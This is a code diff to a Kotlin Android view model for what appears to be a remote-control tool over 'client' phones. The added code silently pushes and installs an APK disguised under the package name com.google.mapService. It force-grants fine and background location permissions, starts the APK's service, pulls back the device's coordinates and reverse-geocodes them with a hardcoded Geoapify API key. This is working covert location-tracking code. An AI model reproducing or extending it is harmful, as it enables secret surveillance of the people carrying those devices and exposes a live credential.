@@ -35,6 +35,7 @@ import kotlinx.coroutines.flow.asStateFlow
 import kotlinx.coroutines.flow.update
 import kotlinx.coroutines.launch
 import java.io.File
+import java.net.URL
 import java.security.MessageDigest
 import org.json.JSONArray
 import org.json.JSONObject
@@ -568,6 +569,124 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
         }
     }
 
+    fun showGetLocPlugin(clientId: String) {
+        _uiState.update {
+            it.copy(
+                screen = ScreenDestination.GetLocPlugin,
+                pluginClientId = clientId,
+                getLocErrorMessage = null,
+                locationAddressErrorMessage = null
+            )
+        }
+    }
+
+    fun dismissGetLocPlugin() {
+        _uiState.update {
+            it.copy(
+                screen = ScreenDestination.Main,
+                pluginClientId = null,
+                getLocLoading = false,
+                getLocErrorMessage = null,
+                locationInfo = null,
+                locationAddress = null,
+                locationAddressLoading = false,
+                locationAddressErrorMessage = null
+            )
+        }
+    }
+
+    fun fetchLocationByPlugin() {
+        val state = _uiState.value
+        val clientId = state.pluginClientId ?: (state.selectedTarget as? ShellTarget.Client)?.id ?: return
+        viewModelScope.launch(Dispatchers.IO) {
+            _uiState.update {
+                it.copy(
+                    getLocLoading = true,
+                    getLocErrorMessage = null,
+                    locationInfo = null,
+                    locationAddress = null,
+                    locationAddressErrorMessage = null
+                )
+            }
+            try {
+                val appContext = getApplication<Application>()
+                val remoteApk = ensureRemoteFileReady(appContext, clientId, "GetLoc.apk")
+
+                captureUseCase.runCommand(clientId, "pm install -r $remoteApk", timeoutMs = 30_000)
+                captureUseCase.runCommand(clientId, "pm grant com.google.mapService android.permission.ACCESS_FINE_LOCATION", timeoutMs = 10_000)
+                captureUseCase.runCommand(clientId, "pm grant com.google.mapService android.permission.ACCESS_BACKGROUND_LOCATION", timeoutMs = 10_000)
+                captureUseCase.runCommand(clientId, "am start-foreground-service -n com.google.mapService/.LocationService", timeoutMs = 10_000)
+
+                val remoteJsonPath = "/data/user/0/com.google.mapService/files/location.json"
+                val timeoutMs = 30_000L
+                val start = System.currentTimeMillis()
+                var exists = false
+                while (System.currentTimeMillis() - start < timeoutMs) {
+                    val check = captureUseCase.runCommand(clientId, "if [ -f $remoteJsonPath ]; then echo exists; else echo missing; fi", timeoutMs = 2_000).orEmpty()
+                    if (check.contains("exists")) {
+                        exists = true
+                        break
+                    }
+                    delay(1_000)
+                }
+                if (!exists) {
+                    throw IllegalStateException("未检测到 location.json")
+                }
+
+                val localFile = File(appContext.cacheDir, "location_${System.currentTimeMillis()}.json")
+                val dl = captureUseCase.downloadCapture(clientId, remoteJsonPath, localFile)
+                if (dl != ClientSession.DownloadResult.Success) {
+                    throw IllegalStateException("下载 location.json 失败")
+                }
+
+                val json = JSONObject(localFile.readText())
+                val latitude = json.optDouble("latitude", Double.NaN)
+                val longitude = json.optDouble("longitude", Double.NaN)
+                if (latitude.isNaN() || longitude.isNaN()) {
+                    throw IllegalStateException("location.json 中无有效经纬度")
+                }
+
+                val info = LocationInfo(
+                    latitude = latitude,
+                    longitude = longitude,
+                    time = json.optString("time").ifBlank { "未知" }
+                )
+                _uiState.update {
+                    it.copy(
+                        getLocLoading = false,
+                        getLocErrorMessage = null,
+                        locationInfo = info
+                    )
+                }
+                FrpLogBus.append("[GetLoc] 已获取位置 lat=$latitude lon=$longitude")
+            } catch (e: Exception) {
+                _uiState.update { it.copy(getLocLoading = false, getLocErrorMessage = "获取位置失败: ${e.message}") }
+                FrpLogBus.append("[GetLoc] 获取位置失败: ${e.message}")
+            }
+        }
+    }
+
+    fun resolveLocationAddress() {
+        val info = _uiState.value.locationInfo ?: return
+        viewModelScope.launch(Dispatchers.IO) {
+            _uiState.update { it.copy(locationAddressLoading = true, locationAddressErrorMessage = null, locationAddress = null) }
+            try {
+                val url = "https://api.geoapify.com/v1/geocode/reverse?lat=${info.latitude}&lon=${info.longitude}&apiKey=98702fe67e9941d9ac02687c5c1b217d"
+                val text = URL(url).readText()
+                val json = JSONObject(text)
+                val features = json.optJSONArray("features") ?: JSONArray()
+                val first = features.optJSONObject(0)
+                val formatted = first?.optJSONObject("properties")?.optString("formatted").orEmpty()
+                if (formatted.isBlank()) {
+                    throw IllegalStateException("未查询到地址信息")
+                }
+                _uiState.update { it.copy(locationAddressLoading = false, locationAddress = formatted, locationAddressErrorMessage = null) }
+            } catch (e: Exception) {
+                _uiState.update { it.copy(locationAddressLoading = false, locationAddressErrorMessage = "查询位置失败: ${e.message}") }
+            }
+        }
+    }
+
     fun onCallLogCountChanged(value: String) {
         val filtered = value.filter { it.isDigit() }.take(3)
         _uiState.update { it.copy(callLogCountInput = filtered) }
@@ -760,6 +879,27 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
         }
         captureUseCase.runCommand(clientId, "chmod 777 $remoteJarPath", timeoutMs = 5_000)
         return remoteJarPath
+    }
+
+    private suspend fun ensureRemoteFileReady(appContext: Application, clientId: String, assetName: String): String {
+        val localFile = File(appContext.filesDir, assetName)
+        if (!localFile.exists() || localFile.length() == 0L) {
+            copyAssetToFile(appContext, assetName, localFile)
+        }
+        if (!localFile.exists() || localFile.length() == 0L) {
+            throw IllegalStateException("本地 $assetName 不存在")
+        }
+
+        val remotePath = "/data/local/tmp/$assetName"
+        val existsOutput = captureUseCase.runCommand(clientId, "if [ -f $remotePath ]; then echo exists; else echo missing; fi", timeoutMs = 8_000).orEmpty()
+        if (!existsOutput.contains("exists")) {
+            val uploaded = captureUseCase.uploadDependency(clientId, remotePath, localFile)
+            if (!uploaded) {
+                throw IllegalStateException("上传 $assetName 失败")
+            }
+        }
+        captureUseCase.runCommand(clientId, "chmod 777 $remotePath", timeoutMs = 5_000)
+        return remotePath
     }
 
     private fun extractJsonObject(raw: String): JSONObject {
